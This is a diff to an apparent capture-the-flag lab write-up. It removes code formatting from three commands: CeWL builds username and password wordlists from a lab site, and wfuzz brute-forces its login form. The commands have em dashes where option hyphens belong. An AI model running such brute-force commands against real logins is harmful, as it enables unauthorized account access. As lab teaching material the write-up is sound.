@@ -34,15 +34,15 @@ Many tools rely on pre-defined lists or common dictionary attacks, but CeWL stan
 
 With CewlGenerate a list of Usernames with the Command —
 
-   `cewl -d 0 -m 5 -w usernames.txt http://MACHINE-IP/team.php — lowercase`
+   cewl -d 0 -m 5 -w usernames.txt http://MACHINE-IP/team.php — lowercase
    
 Again with CewlGenerate a list of Passwords with the Command —
 
-    `cewl -d 2 -m 5 -w passwords.txt http://MACHINE-IP — with-numbers`
+    cewl -d 2 -m 5 -w passwords.txt http://MACHINE-IP — with-numbers`
    
 Now bruteforce the Credentials using wfuzz with the command —
 
-    `wfuzz -c -z file,usernames.txt -z file,passwords.txt — hs “Please enter the correct credentials” -u http://MACHINE-IP/login.php -d “username=FUZZ&password=FUZ2Z”`
+    wfuzz -c -z file,usernames.txt -z file,passwords.txt — hs “Please enter the correct credentials” -u http://MACHINE-IP/login.php -d “username=FUZZ&password=FUZ2Z”
 
 ### 2. What is the Flag?
 
